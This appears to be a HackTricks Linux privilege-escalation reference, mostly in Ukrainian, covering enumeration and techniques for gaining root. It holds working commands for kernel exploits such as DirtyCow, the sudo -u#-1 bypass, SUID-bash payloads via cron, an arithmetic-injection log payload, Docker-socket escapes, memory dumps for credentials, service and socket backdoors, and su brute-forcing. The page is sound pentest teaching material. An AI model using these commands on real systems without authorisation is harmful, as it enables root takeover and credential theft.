# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## System Information

### OS info

Почнемо збирати інформацію про запущену ОС
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Якщо ви **have write permissions on any folder inside the `PATH`**, можливо, ви зможете hijack деякі libraries або binaries:
```bash
echo $PATH
```
### Інформація про Env

Чи є у змінних середовища цікава інформація, паролі або API-ключі?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Перевірте версію kernel і чи існує exploit, який можна використати для escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Ви можете знайти хороший список вразливих kernel і деякі вже **compiled exploits** тут: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) і [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Інші сайти, де ви можете знайти деякі **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Щоб витягти всі vulnerable kernel versions з цього сайту, ви можете виконати:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Інструменти, які можуть допомогти в пошуку kernel exploits:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (запустити на victim, перевіряє лише exploits для kernel 2.x)

Завжди **шукайте версію ядра в Google**, можливо ваша версія ядра згадується в якомусь kernel exploit, і тоді ви будете впевнені, що цей exploit дійсний.

### CVE-2016-5195 (DirtyCow)

Підвищення привілеїв у Linux - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo version

На основі вразливих версій sudo, які з'являються в:
```bash
searchsploit sudo
```
Ви можете перевірити, чи версія sudo вразлива, використовуючи цей grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Від @sickrov
```
sudo -u#-1 /bin/bash
```
### Перевірка підпису Dmesg не пройшла

Перегляньте **smasher2 box of HTB** як **приклад** того, як цей vuln можна експлуатувати
```bash
dmesg 2>/dev/null | grep "signature"
```
### Більш детальна енумерація системи
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Перелічити можливі заходи захисту

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Якщо ви перебуваєте всередині docker container, ви можете спробувати втекти з нього:

{{#ref}}
docker-security/
{{#endref}}

## Диски

Перевірте **що змонтовано та відмонтовано**, де і чому. Якщо щось відмонтовано, ви можете спробувати його змонтувати та перевірити наявність приватної інформації.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Корисне програмне забезпечення

Перелічіть корисні бінарні файли
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Також перевірте, чи встановлено **будь-який компілятор**. Це корисно, якщо вам потрібно використати якийсь kernel exploit, оскільки рекомендується компілювати його на машині, де ви збираєтеся його використовувати (або на подібній).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Встановлене вразливе програмне забезпечення

Перевірте **версію встановлених пакетів та сервісів**. Можливо, є якась стара версія Nagios (наприклад), якою можна скористатися для ескалації привілеїв…\
Рекомендується вручну перевіряти версії найбільш підозрілих встановлених програм.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Якщо у вас є доступ по SSH до машини, ви також можете використати **openVAS** для перевірки застарілого або вразливого програмного забезпечення, встановленого на ній.

> [!NOTE] > _Зверніть увагу, що ці команди виведуть багато інформації, яка здебільшого буде марною, тому рекомендовано використовувати програми на кшталт OpenVAS або подібні, які перевірять, чи будь-яка встановлена версія програмного забезпечення вразлива до відомих exploits_

## Процеси

Подивіться, **які процеси** виконуються і перевірте, чи якийсь процес не має **більше привілеїв, ніж повинен** (можливо tomcat запущено під root?)
```bash
ps aux
ps -ef
top -n 1
```
Завжди перевіряйте наявність можливих [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** виявляє їх, перевіряючи параметр `--inspect` у командному рядку процесу.\
Також **перевірте свої привілеї щодо бінарних файлів процесів**, можливо, ви зможете перезаписати чиїсь.

### Моніторинг процесів

Ви можете використовувати інструменти на кшталт [**pspy**](https://github.com/DominicBreuker/pspy) для моніторингу процесів. Це може бути дуже корисно для ідентифікації вразливих процесів, які виконуються часто або коли виконуються певні умови.

### Пам'ять процесу

Деякі служби сервера зберігають **credentials in clear text inside the memory**.\
Зазвичай вам потрібні **root privileges** щоб читати пам'ять процесів, що належать іншим користувачам, тому це зазвичай більш корисно, коли ви вже root і хочете виявити більше credentials.\
Однак пам'ятайте, що **як звичайний користувач ви можете читати пам'ять процесів, які належать вам**.

> [!WARNING]
> Зверніть увагу, що зараз більшість машин **за замовчуванням не дозволяють ptrace**, що означає, що ви не можете отримати дамп інших процесів, які належать вашому непривілейованому користувачу.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

Якщо у вас є доступ до пам'яті служби FTP (наприклад), ви можете отримати Heap і шукати в ньому credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB скрипт
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Для заданого ідентифікатора процесу (PID), **maps показують, як пам'ять відображається у віртуальному адресному просторі цього процесу**; вони також показують **права доступу для кожного відображеного регіону**. Псевдо-файл **mem** **надає доступ до самої пам'яті процесу**. З файлу **maps** ми знаємо, які **регіони пам'яті доступні для читання** та їхні зсуви. Ми використовуємо цю інформацію, щоб **seek into the mem file and dump all readable regions** у файл.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` надає доступ до **фізичної** пам'яті системи, а не до віртуальної пам'яті. Віртуальний простір адрес ядра можна отримати за допомогою /dev/kmem.\
Зазвичай, `/dev/mem` доступний для читання лише користувачеві **root** та групі kmem.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump для Linux

ProcDump — це реалізація для Linux класичного інструмента ProcDump із набору Sysinternals для Windows. Отримати можна за [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Інструменти

Щоб зробити дамп пам'яті процесу, можна використати:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Ви можете вручну видалити вимоги root і зробити дамп процесу, який належить вам
- Скрипт A.5 з [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (вимагається root)

### Облікові дані з пам'яті процесу

#### Ручний приклад

Якщо ви виявите, що процес authenticator запущений:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Ви можете dump the process (див. попередні розділи, щоб знайти різні способи dump the memory of a process) і шукати credentials inside the memory:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

The tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) буде **викрадати облікові дані у відкритому тексті з пам'яті** та з деяких **відомих файлів**. Для коректної роботи він потребує привілеїв root.

| Функція                                          | Назва процесу        |
| ------------------------------------------------ | -------------------- |
| Пароль GDM (Kali Desktop, Debian Desktop)        | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop)| gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                         | lightdm              |
| VSFTPd (активні FTP-з'єднання)                   | vsftpd               |
| Apache2 (активні HTTP Basic Auth сесії)          | apache2              |
| OpenSSH (активні SSH сесії - використання sudo)  | sshd:                |

#### Пошук регулярних виразів/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron jobs

Перевірте, чи будь-яке заплановане завдання вразливе. Можливо, ви зможете скористатися скриптом, що виконується від імені root (wildcard vuln? можна змінити файли, які використовує root? use symlinks? створити певні файли в каталозі, який використовує root?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Шлях Cron

Наприклад, у файлі _/etc/crontab_ можна знайти PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Зверніть увагу, як користувач "user" має права запису в /home/user_)

Якщо в цьому crontab користувач root намагається виконати якусь команду або скрипт без встановленого PATH. Наприклад: _\* \* \* \* root overwrite.sh_\
Тоді ви можете отримати root shell, використавши:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron, що використовує script з wildcard (Wildcard Injection)

Якщо script виконується від root і має “**\***” всередині command, це можна використати, щоб виконати непередбачувані дії (наприклад privesc). Приклад:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Якщо wildcard розміщено перед шляхом на кшталт** _**/some/path/\***_ **, це не вразливе (навіть** _**./\***_ **не є).**

Прочитайте наступну сторінку для додаткових трюків з експлуатації wildcard:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash виконує parameter expansion і command substitution перед arithmetic evaluation в ((...)), $((...)) та let. Якщо root cron/parser читає untrusted log fields і підставляє їх в arithmetic context, нападник може інжектувати command substitution $(...), який виконається як root коли cron запуститься.

- Чому це працює: У Bash, expansions відбуваються в такому порядку: parameter/variable expansion, command substitution, arithmetic expansion, потім word splitting і pathname expansion. Тому значення на кшталт `$(/bin/bash -c 'id > /tmp/pwn')0` спочатку підставляється (виконуючи команду), а потім залишковий числовий `0` використовується для арифметики, тож скрипт продовжує роботу без помилок.

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Get attacker-controlled text written into the parsed log so that the numeric-looking field contains a command substitution and ends with a digit. Ensure your command does not print to stdout (or redirect it) so the arithmetic remains valid.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Якщо script, який виконується від root, використовує **директорію, до якої у вас повний доступ**, можливо, буде корисно видалити цю папку і **створити symlink до іншої папки**, яка містить скрипт під вашим контролем.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Frequent cron jobs

Ви можете моніторити процеси, щоб знайти ті, які виконуються кожні 1, 2 або 5 хвилин. Можливо, ви зможете скористатися цим і підвищити привілеї.

Наприклад, щоб **моніторити кожні 0.1s протягом 1 хвилини**, **сортувати за найменш виконуваними командами** та видалити команди, які були виконані найчастіше, ви можете зробити так:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Ви також можете використовувати** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (це моніторитиме й перераховуватиме кожен процес, який запускається).

### Невидимі cron jobs

Можна створити cronjob, **помістивши carriage return після коментаря** (без символу нового рядка), і cron job працюватиме. Приклад (зверніть увагу на символ carriage return):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Сервіси

### Файли _.service_, доступні для запису

Перевірте, чи можете записати будь-який `.service` файл; якщо так, ви **можете змінити його**, щоб він **виконував** ваш **backdoor** коли служба **запускається**, **перезапускається** або **зупиняється** (можливо, доведеться почекати, поки машина не перезавантажиться).\
Наприклад створіть ваш backdoor всередині .service файлу з **`ExecStart=/tmp/script.sh`**

### Бінарні файли сервісів, доступні для запису

Майте на увазі, що якщо у вас є **write permissions over binaries being executed by services**, ви можете змінити їх на backdoors, тож при повторному виконанні сервісів backdoors будуть виконані.

### systemd PATH - Відносні шляхи

Ви можете переглянути PATH, який використовує **systemd**, за допомогою:
```bash
systemctl show-environment
```
Якщо ви виявите, що можете **записувати** в будь-яку з папок цього шляху, ви, можливо, зможете **escalate privileges**. Потрібно шукати **відносні шляхи, які використовуються у файлах конфігурації сервісів**, наприклад:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Потім створіть **executable** з **same name as the relative path binary** всередині systemd PATH folder, у який ви маєте право запису, і коли службі буде наказано виконати вразливу дію (**Start**, **Stop**, **Reload**), ваш **backdoor** буде виконано (непривілейовані користувачі зазвичай не можуть запускати/зупиняти служби, але перевірте, чи можете використати `sudo -l`).

**Learn more about services with `man systemd.service`.**

## **Таймери**

**Таймери** — це unit-файли systemd, чиї імена закінчуються на `**.timer**`, які контролюють `**.service**` файли або події. **Таймери** можуть використовуватися як альтернатива cron, оскільки вони мають вбудовану підтримку календарних подій і монотонних тайм-подій та можуть виконуватися асинхронно.

Ви можете перерахувати всі таймери за допомогою:
```bash
systemctl list-timers --all
```
### Таймери, доступні для запису

Якщо ви можете змінити таймер, ви можете змусити його запускати деякі існуючі одиниці systemd.unit (наприклад `.service` або `.target`)
```bash
Unit=backdoor.service
```
У документації можна прочитати, що таке Unit:

> Unit, який буде активовано, коли цей timer спрацює. Аргумент — це ім'я unit, суфікс якого не є ".timer". Якщо не вказано, це значення за замовчуванням відповідає service, що має те саме ім'я, що й timer unit, за винятком суфікса. (Див. вище.) Рекомендується, щоб ім'я unit, яке активується, і ім'я unit таймера були однаковими, за винятком суфікса.

Отже, щоб зловживати цією привілеєю, вам потрібно:

- Знайти якийсь systemd unit (наприклад, `.service`), який **виконує записуваний бінарний файл**
- Знайти якийсь systemd unit, який **виконує відносний шлях** і над яким ви маєте **права запису** у **systemd PATH** (щоб імітувати цей виконуваний файл)

**Дізнайтеся більше про таймери за допомогою `man systemd.timer`.**

### **Увімкнення таймера**

Щоб увімкнути таймер, потрібні права root і виконати:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) enable **process communication** on the same or different machines within client-server models. They utilize standard Unix descriptor files for inter-computer communication and are set up through `.socket` files.

Sockets can be configured using `.socket` files.

**Learn more about sockets with `man systemd.socket`.** Inside this file, several interesting parameters can be configured:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: These options are different but a summary is used to **indicate where it is going to listen** to the socket (the path of the AF_UNIX socket file, the IPv4/6 and/or port number to listen, etc.)
- `Accept`: Takes a boolean argument. If **true**, a **service instance is spawned for each incoming connection** and only the connection socket is passed to it. If **false**, all listening sockets themselves are **passed to the started service unit**, and only one service unit is spawned for all connections. This value is ignored for datagram sockets and FIFOs where a single service unit unconditionally handles all incoming traffic. **Defaults to false**. For performance reasons, it is recommended to write new daemons only in a way that is suitable for `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Takes one or more command lines, which are **executed before** or **after** the listening **sockets**/FIFOs are **created** and bound, respectively. The first token of the command line must be an absolute filename, then followed by arguments for the process.
- `ExecStopPre`, `ExecStopPost`: Additional **commands** that are **executed before** or **after** the listening **sockets**/FIFOs are **closed** and removed, respectively.
- `Service`: Specifies the **service** unit name **to activate** on **incoming traffic**. This setting is only allowed for sockets with Accept=no. It defaults to the service that bears the same name as the socket (with the suffix replaced). In most cases, it should not be necessary to use this option.

### Записувані .socket файли

If you find a **writable** `.socket` file you can **add** at the beginning of the `[Socket]` section something like: `ExecStartPre=/home/kali/sys/backdoor` and the backdoor will be executed before the socket is created. Therefore, you will **probably need to wait until the machine is rebooted.**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Записувані sockets

If you **identify any writable socket** (_now we are talking about Unix Sockets and not about the config `.socket` files_), then **you can communicate** with that socket and maybe exploit a vulnerability.

### Перерахування Unix Sockets
```bash
netstat -a -p --unix
```
### Сире з'єднання
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Зверніть увагу, що можуть бути деякі **sockets, що прослуховують HTTP** запити (_Я не маю на увазі .socket files, а файли, що виступають як unix sockets_). Ви можете перевірити це за допомогою:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Якщо socket **відповідає на HTTP** запит, то ви можете **спілкуватися** з ним і, можливо, **exploit some vulnerability**.

### Docker socket доступний для запису

Docker socket, який часто знаходиться за шляхом `/var/run/docker.sock`, є критичним файлом, який слід захистити. За замовчуванням він доступний для запису користувачеві `root` та членам групи `docker`. Наявність прав на запис цього socket може призвести до privilege escalation. Нижче наведено пояснення, як це можна зробити, а також альтернативні методи на випадок, якщо Docker CLI недоступний.

#### **Privilege Escalation with Docker CLI**

Якщо ви маєте права запису до Docker socket, ви можете escalate privileges за допомогою наведених нижче команд:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Ці команди дозволяють запустити контейнер з доступом root до файлової системи хоста.

#### **Використання Docker API безпосередньо**

У випадках, коли Docker CLI недоступний, Docker socket все одно можна використовувати через Docker API та команди `curl`.

1.  **List Docker Images:** Отримати список доступних образів.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Надішліть запит на створення контейнера, який монтує кореневий каталог системи хоста.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Запустіть щойно створений контейнер:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Підключіться до контейнера за допомогою `socat`, щоб встановити з’єднання та виконувати команди в його контексті.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Після встановлення з’єднання через `socat` ви можете виконувати команди безпосередньо в контейнері з доступом root до файлової системи хоста.

### Інше

Зауважте, що якщо у вас є права запису на docker socket через те, що ви **є у групі `docker`**, у вас є [**більше способів ескалації привілеїв**](interesting-groups-linux-pe/index.html#docker-group). Якщо [**docker API слухає на порту** ви також зможете його скомпрометувати](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Перевірте **більше способів вийти з docker або зловживати ним для ескалації привілеїв** у:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Якщо ви виявите, що можете використовувати команду **`ctr`**, прочитайте наступну сторінку, оскільки **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Якщо ви виявите, що можете використовувати команду **`runc`**, прочитайте наступну сторінку, оскільки **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus — це розвинена **система міжпроцесної комунікації (IPC)**, яка дозволяє додаткам ефективно взаємодіяти та обмінюватися даними. Розроблена з урахуванням сучасної Linux-системи, вона пропонує надійну основу для різних форм взаємодії між додатками.

Система є універсальною: вона підтримує базовий IPC, що покращує обмін даними між процесами, нагадуючи розширені UNIX domain sockets. Крім того, вона допомагає транслювати події або сигнали, сприяючи безшовній інтеграції компонентів системи. Наприклад, сигнал від Bluetooth daemon про вхідний дзвінок може змусити програвач музики заглушити звук, покращуючи досвід користувача. Додатково, D-Bus підтримує систему віддалених об'єктів, спрощуючи запити служб і виклики методів між додатками, оптимізуючи процеси, які раніше були складними.

D-Bus працює за **моделлю allow/deny**, керуючи дозволами на повідомлення (виклики методів, відправлення сигналів тощо) на основі сумарного ефекту відповідних правил політики. Ці політики вказують, які взаємодії дозволені з шиною, і потенційно можуть призвести до privilege escalation через експлуатацію цих дозволів.

Наведено приклад такої політики в `/etc/dbus-1/system.d/wpa_supplicant.conf`, що деталізує дозволи для користувача root на володіння, надсилання та отримання повідомлень від `fi.w1.wpa_supplicant1`.

Політики без вказаного користувача або групи застосовуються універсально, тоді як політики контексту "default" застосовуються до всіх, не охоплених іншими конкретними політиками.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Дізнайтеся, як enumerate та exploit D-Bus communication тут:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Мережа**

Завжди цікаво enumerate мережу та визначити положення машини.

### Загальна enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Відкриті порти

Завжди перевіряйте мережеві сервіси, що працюють на машині, з якими ви не могли взаємодіяти перед тим, як отримати до неї доступ:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Перевірте, чи можете sniff traffic. Якщо так, ви зможете отримати деякі облікові дані.
```
timeout 1 tcpdump
```
## Користувачі

### Загальна інвентаризація

Перевірте, **хто** ви, які **привілеї** у вас є, які **користувачі** є в системі, хто може **login** і які мають **root privileges**:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Деякі версії Linux постраждали від бага, який дозволяє користувачам з **UID > INT_MAX** підвищувати привілеї. Більше інформації: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
Експлуатувати його можна за допомогою: **`systemd-run -t /bin/bash`**

### Групи

Перевірте, чи є ви **членом якоїсь групи**, яка могла б надати вам root privileges:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Буфер обміну

Перевірте, чи знаходиться в буфері обміну щось цікаве (якщо можливо)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Політика паролів
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Known passwords

Якщо ви **знаєте будь-який пароль** середовища, **спробуйте увійти під кожного користувача**, використавши цей пароль.

### Su Brute

Якщо вам не важливо створювати багато шуму і на комп'ютері присутні бінарні файли `su` та `timeout`, ви можете спробувати brute-force користувача за допомогою [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
